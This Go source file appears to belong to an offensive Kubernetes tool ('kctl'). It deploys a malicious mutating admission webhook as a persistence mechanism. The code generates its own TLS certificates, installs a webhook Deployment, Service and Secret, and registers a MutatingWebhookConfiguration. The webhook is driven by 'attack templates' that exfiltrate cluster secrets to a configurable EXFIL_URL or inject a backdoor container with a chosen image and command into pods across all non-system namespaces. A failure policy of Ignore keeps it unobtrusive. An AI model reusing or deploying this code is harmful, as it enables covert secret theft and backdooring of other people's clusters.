package persist

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"net/url"
	"strings"
	"time"

	"kctl/config"
	"kctl/internal/client/k8s"
	"kctl/pkg/types"
)

// ==================== TLS 证书生成 ====================

// certConfig 证书生成配置
type certConfig struct {
	CommonName string
	DNSNames   []string
	IPs        []net.IP
}

// generateCert 生成自签名证书（内部通用函数）
func generateCert(cfg *certConfig) (*types.WebhookCert, error) {
	// 生成 CA
	caKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("生成 CA 私钥失败: %w", err)
	}

	caTemplate := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{Organization: []string{"kctl"}, CommonName: "kctl-webhook-ca"},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
	}

	caCertDER, err := x509.CreateCertificate(rand.Reader, caTemplate, caTemplate, &caKey.PublicKey, caKey)
	if err != nil {
		return nil, fmt.Errorf("创建 CA 证书失败: %w", err)
	}

	// 生成服务端证书
	serverKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("生成服务端私钥失败: %w", err)
	}

	serverTemplate := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject:      pkix.Name{Organization: []string{"kctl"}, CommonName: cfg.CommonName},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().AddDate(10, 0, 0),
		KeyUsage:     x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		DNSNames:     cfg.DNSNames,
		IPAddresses:  cfg.IPs,
	}

	caCert, err := x509.ParseCertificate(caCertDER)
	if err != nil {
		return nil, fmt.Errorf("解析 CA 证书失败: %w", err)
	}

	serverCertDER, err := x509.CreateCertificate(rand.Reader, serverTemplate, caCert, &serverKey.PublicKey, caKey)
	if err != nil {
		return nil, fmt.Errorf("创建服务端证书失败: %w", err)
	}

	return &types.WebhookCert{
		CACert:     pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: caCertDER}),
		ServerCert: pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: serverCertDER}),
		ServerKey:  pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(serverKey)}),
	}, nil
}

// GenerateWebhookCert 生成集群内 Webhook 服务的证书
func GenerateWebhookCert(serviceName, namespace string) (*types.WebhookCert, error) {
	return generateCert(&certConfig{
		CommonName: serviceName,
		DNSNames: []string{
			serviceName,
			fmt.Sprintf("%s.%s", serviceName, namespace),
			fmt.Sprintf("%s.%s.svc", serviceName, namespace),
			fmt.Sprintf("%s.%s.svc.cluster.local", serviceName, namespace),
		},
	})
}

// GenerateWebhookCertForURL 为外部 URL 生成证书
func GenerateWebhookCertForURL(externalURL string) (*types.WebhookCert, error) {
	parsedURL, err := url.Parse(externalURL)
	if err != nil {
		return nil, fmt.Errorf("解析 URL 失败: %w", err)
	}

	host := parsedURL.Hostname()
	if host == "" {
		return nil, fmt.Errorf("URL 中没有主机名")
	}

	cfg := &certConfig{CommonName: host}
	if ip := net.ParseIP(host); ip != nil {
		cfg.IPs = []net.IP{ip}
	} else {
		cfg.DNSNames = []string{host}
	}

	return generateCert(cfg)
}

// ==================== Webhook 部署 ====================

// DeployWebhook 部署 Webhook 服务到集群
func DeployWebhook(ctx context.Context, client k8s.Client, opts *types.WebhookInjectOptions) (*types.WebhookDeployment, error) {
	if opts.ExternalURL != "" {
		return deployExternalWebhook(ctx, client, opts)
	}
	return deployInClusterWebhook(ctx, client, opts)
}

// generateWebhookName 生成唯一的 webhook 名称
func generateWebhookName() string {
	return fmt.Sprintf("%s-%d", config.DefaultWebhookNamePrefix, time.Now().Unix())
}

// buildLabels 构建通用标签
func buildLabels(name, component string) map[string]string {
	return map[string]string{
		config.WebhookManagedByLabel: config.WebhookManagedByValue,
		config.WebhookNameLabel:      name,
		config.WebhookComponentLabel: component,
	}
}

// deployExternalWebhook 部署使用外部 URL 的 Webhook
func deployExternalWebhook(ctx context.Context, client k8s.Client, opts *types.WebhookInjectOptions) (*types.WebhookDeployment, error) {
	baseName := generateWebhookName()
	deployment := &types.WebhookDeployment{
		WebhookName: baseName,
		ExternalURL: opts.ExternalURL,
	}

	cert, err := GenerateWebhookCertForURL(opts.ExternalURL)
	if err != nil {
		return nil, fmt.Errorf("生成证书失败: %w", err)
	}
	deployment.Cert = cert

	webhookData, err := buildMutatingWebhookJSON(deployment, opts, buildLabels(baseName, "webhook-external"), cert.CACert)
	if err != nil {
		return nil, fmt.Errorf("构建 Webhook 配置失败: %w", err)
	}
	if err := client.CreateMutatingWebhook(ctx, webhookData); err != nil {
		return nil, fmt.Errorf("创建 Webhook 配置失败: %w", err)
	}

	return deployment, nil
}

// deployInClusterWebhook 部署集群内 Webhook 服务
func deployInClusterWebhook(ctx context.Context, client k8s.Client, opts *types.WebhookInjectOptions) (*types.WebhookDeployment, error) {
	baseName := generateWebhookName()
	deployment := &types.WebhookDeployment{
		Namespace:   opts.Namespace,
		ServiceName: baseName + "-svc",
		SecretName:  baseName + "-certs",
		Deployment:  baseName,
		WebhookName: baseName,
	}

	labels := buildLabels(baseName, "webhook")
	webhookImage := opts.WebhookImage
	if webhookImage == "" {
		webhookImage = config.DefaultWebhookImage
	}

	// 1. 确保命名空间存在
	if err := ensureNamespace(ctx, client, opts.Namespace, labels); err != nil {
		return nil, err
	}

	// 2. 生成 TLS 证书
	cert, err := GenerateWebhookCert(deployment.ServiceName, opts.Namespace)
	if err != nil {
		return nil, fmt.Errorf("生成证书失败: %w", err)
	}

	// 3. 创建资源
	resources := []struct {
		name    string
		builder func() ([]byte, error)
		creator func([]byte) error
	}{
		{"Secret", func() ([]byte, error) { return buildSecretJSON(deployment.SecretName, opts.Namespace, labels, cert) },
			func(data []byte) error { return client.CreateSecret(ctx, opts.Namespace, data) }},
		{"Deployment", func() ([]byte, error) { return buildDeploymentJSON(deployment, opts, labels, webhookImage) },
			func(data []byte) error { return client.CreateDeployment(ctx, opts.Namespace, data) }},
		{"Service", func() ([]byte, error) {
			return buildServiceJSON(deployment.ServiceName, opts.Namespace, labels, deployment.Deployment)
		},
			func(data []byte) error { return client.CreateService(ctx, opts.Namespace, data) }},
		{"Webhook", func() ([]byte, error) { return buildMutatingWebhookJSON(deployment, opts, labels, cert.CACert) },
			func(data []byte) error { return client.CreateMutatingWebhook(ctx, data) }},
	}

	for _, r := range resources {
		data, err := r.builder()
		if err != nil {
			return nil, fmt.Errorf("构建 %s 失败: %w", r.name, err)
		}
		if err := r.creator(data); err != nil {
			return nil, fmt.Errorf("创建 %s 失败: %w", r.name, err)
		}
	}

	return deployment, nil
}

// ensureNamespace 确保命名空间存在
func ensureNamespace(ctx context.Context, client k8s.Client, namespace string, labels map[string]string) error {
	namespaces, err := client.ListNamespaces(ctx)
	if err != nil {
		return fmt.Errorf("列出命名空间失败: %w", err)
	}

	for _, ns := range namespaces {
		if ns == namespace {
			return nil
		}
	}

	if err := client.CreateNamespace(ctx, namespace, labels); err != nil {
		return fmt.Errorf("创建命名空间失败: %w", err)
	}
	return nil
}

// RemoveWebhook 移除 Webhook 及相关资源
func RemoveWebhook(ctx context.Context, client k8s.Client, info *types.WebhookInfo) error {
	if err := client.DeleteMutatingWebhook(ctx, info.Name); err != nil {
		return fmt.Errorf("删除 Webhook 配置失败: %w", err)
	}

	if info.ServiceNS != "" && info.ServiceName != "" {
		baseName := strings.TrimSuffix(info.ServiceName, "-svc")
		_ = client.DeleteService(ctx, info.ServiceNS, info.ServiceName)
		_ = client.DeleteDeployment(ctx, info.ServiceNS, baseName)
		_ = client.DeleteSecret(ctx, info.ServiceNS, baseName+"-certs")
	}

	return nil
}

// ==================== JSON 构建辅助函数 ====================

func buildSecretJSON(name, namespace string, labels map[string]string, cert *types.WebhookCert) ([]byte, error) {
	return json.Marshal(map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "Secret",
		"metadata":   buildMetadata(name, namespace, labels),
		"type":       "kubernetes.io/tls",
		"data": map[string]string{
			"tls.crt": base64.StdEncoding.EncodeToString(cert.ServerCert),
			"tls.key": base64.StdEncoding.EncodeToString(cert.ServerKey),
			"ca.crt":  base64.StdEncoding.EncodeToString(cert.CACert),
		},
	})
}

func buildDeploymentJSON(deployment *types.WebhookDeployment, opts *types.WebhookInjectOptions, labels map[string]string, webhookImage string) ([]byte, error) {
	envVars := buildEnvVars(opts)

	return json.Marshal(map[string]interface{}{
		"apiVersion": "apps/v1",
		"kind":       "Deployment",
		"metadata":   buildMetadata(deployment.Deployment, opts.Namespace, labels),
		"spec": map[string]interface{}{
			"replicas": 1,
			"selector": map[string]interface{}{
				"matchLabels": map[string]string{config.WebhookNameLabel: deployment.Deployment},
			},
			"template": map[string]interface{}{
				"metadata": map[string]interface{}{
					"labels": map[string]string{
						config.WebhookNameLabel:      deployment.Deployment,
						config.WebhookManagedByLabel: config.WebhookManagedByValue,
					},
				},
				"spec": map[string]interface{}{
					"containers": []map[string]interface{}{
						{
							"name":            "webhook",
							"image":           webhookImage,
							"imagePullPolicy": "IfNotPresent",
							"env":             envVars,
							"ports":           []map[string]interface{}{{"containerPort": config.DefaultWebhookPort, "protocol": "TCP"}},
							"volumeMounts":    []map[string]interface{}{{"name": "certs", "mountPath": "/certs", "readOnly": true}},
							"resources": map[string]interface{}{
								"limits":   map[string]string{"cpu": "100m", "memory": "64Mi"},
								"requests": map[string]string{"cpu": "10m", "memory": "32Mi"},
							},
							"livenessProbe": map[string]interface{}{
								"httpGet":             map[string]interface{}{"path": "/healthz", "port": config.DefaultWebhookPort, "scheme": "HTTPS"},
								"initialDelaySeconds": 5,
								"periodSeconds":       10,
							},
						},
					},
					"volumes": []map[string]interface{}{
						{"name": "certs", "secret": map[string]interface{}{"secretName": deployment.SecretName}},
					},
				},
			},
		},
	})
}

func buildServiceJSON(name, namespace string, labels map[string]string, deploymentName string) ([]byte, error) {
	return json.Marshal(map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "Service",
		"metadata":   buildMetadata(name, namespace, labels),
		"spec": map[string]interface{}{
			"selector": map[string]string{config.WebhookNameLabel: deploymentName},
			"ports":    []map[string]interface{}{{"port": config.DefaultWebhookPort, "targetPort": config.DefaultWebhookPort, "protocol": "TCP"}},
		},
	})
}

func buildMutatingWebhookJSON(deployment *types.WebhookDeployment, opts *types.WebhookInjectOptions, labels map[string]string, caBundle []byte) ([]byte, error) {
	template := types.GetWebhookAttackTemplate(opts.AttackType)
	if template == nil {
		return nil, fmt.Errorf("未找到攻击模板: %s", opts.AttackType)
	}

	// 构建 clientConfig（区分集群内和外部 URL）
	var clientConfig map[string]interface{}
	if opts.ExternalURL != "" {
		clientConfig = map[string]interface{}{
			"url":      opts.ExternalURL,
			"caBundle": base64.StdEncoding.EncodeToString(caBundle),
		}
	} else {
		clientConfig = map[string]interface{}{
			"service": map[string]interface{}{
				"name":      deployment.ServiceName,
				"namespace": deployment.Namespace,
				"path":      "/",
				"port":      config.DefaultWebhookPort,
			},
			"caBundle": base64.StdEncoding.EncodeToString(caBundle),
		}
	}

	return json.Marshal(map[string]interface{}{
		"apiVersion": "admissionregistration.k8s.io/v1",
		"kind":       "MutatingWebhookConfiguration",
		"metadata":   map[string]interface{}{"name": deployment.WebhookName, "labels": labels},
		"webhooks": []map[string]interface{}{
			{
				"name":         deployment.WebhookName + ".kctl.io",
				"clientConfig": clientConfig,
				"rules": []map[string]interface{}{
					{
						"operations":  template.Operations,
						"apiGroups":   template.APIGroups,
						"apiVersions": []string{"v1"},
						"resources":   template.Resources,
						"scope":       "Namespaced",
					},
				},
				"failurePolicy":           "Ignore",
				"matchPolicy":             "Equivalent",
				"sideEffects":             "None",
				"admissionReviewVersions": []string{"v1"},
				"namespaceSelector":       buildNamespaceSelector(opts),
			},
		},
	})
}

// ==================== 辅助函数 ====================

func buildMetadata(name, namespace string, labels map[string]string) map[string]interface{} {
	meta := map[string]interface{}{"name": name, "labels": labels}
	if namespace != "" {
		meta["namespace"] = namespace
	}
	return meta
}

func buildEnvVars(opts *types.WebhookInjectOptions) []map[string]string {
	envVars := []map[string]string{
		{"name": "WEBHOOK_MODE", "value": string(opts.AttackType)},
	}

	switch opts.AttackType {
	case types.WebhookAttackSecretExfil:
		envVars = append(envVars, map[string]string{"name": "EXFIL_URL", "value": opts.ExfilURL})
	case types.WebhookAttackPodBackdoor:
		backdoorName := opts.BackdoorName
		if backdoorName == "" {
			backdoorName = config.DefaultBackdoorContainerName
		}
		envVars = append(envVars,
			map[string]string{"name": "BACKDOOR_IMAGE", "value": opts.BackdoorImage},
			map[string]string{"name": "BACKDOOR_NAME", "value": backdoorName},
			map[string]string{"name": "BACKDOOR_COMMAND", "value": strings.Join(opts.BackdoorCommand, ",")},
		)
	}
	return envVars
}

func buildNamespaceSelector(opts *types.WebhookInjectOptions) map[string]interface{} {
	if len(opts.TargetNamespaces) > 0 {
		return map[string]interface{}{
			"matchExpressions": []map[string]interface{}{
				{"key": "kubernetes.io/metadata.name", "operator": "In", "values": opts.TargetNamespaces},
			},
		}
	}

	excludeNS := append([]string{}, config.DefaultExcludeNamespaces...)
	if opts.Namespace != "" {
		excludeNS = append(excludeNS, opts.Namespace)
	}
	excludeNS = append(excludeNS, opts.ExcludeNamespaces...)

	return map[string]interface{}{
		"matchExpressions": []map[string]interface{}{
			{"key": "kubernetes.io/metadata.name", "operator": "NotIn", "values": excludeNS},
		},
	}
}

// ==================== 预览格式化 ====================

// FormatWebhookPreview 格式化 Webhook 部署预览
func FormatWebhookPreview(opts *types.WebhookInjectOptions) string {
	var sb strings.Builder

	sb.WriteString("========== Webhook 部署预览 ==========\n\n")

	if template := types.GetWebhookAttackTemplate(opts.AttackType); template != nil {
		fmt.Fprintf(&sb, "攻击类型: %s\n", template.Name)
		fmt.Fprintf(&sb, "描述: %s\n", template.Description)
	}

	if opts.ExternalURL != "" {
		sb.WriteString("\n模式: 外部 URL\n")
		fmt.Fprintf(&sb, "外部 URL: %s\n", opts.ExternalURL)
	} else {
		sb.WriteString("\n模式: 集群内部署\n")
		fmt.Fprintf(&sb, "命名空间: %s\n", opts.Namespace)
		webhookImage := opts.WebhookImage
		if webhookImage == "" {
			webhookImage = config.DefaultWebhookImage
		}
		fmt.Fprintf(&sb, "Webhook 镜像: %s\n", webhookImage)
	}

	switch opts.AttackType {
	case types.WebhookAttackSecretExfil:
		fmt.Fprintf(&sb, "\n外泄 URL: %s\n", opts.ExfilURL)
	case types.WebhookAttackPodBackdoor:
		fmt.Fprintf(&sb, "\n后门镜像: %s\n", opts.BackdoorImage)
		fmt.Fprintf(&sb, "后门命令: %v\n", opts.BackdoorCommand)
	}

	if len(opts.TargetNamespaces) > 0 {
		fmt.Fprintf(&sb, "\n目标命名空间: %v\n", opts.TargetNamespaces)
	} else {
		sb.WriteString("\n目标命名空间: 所有 (排除系统命名空间)\n")
	}

	sb.WriteString("\n======================================\n")

	return sb.String()
}
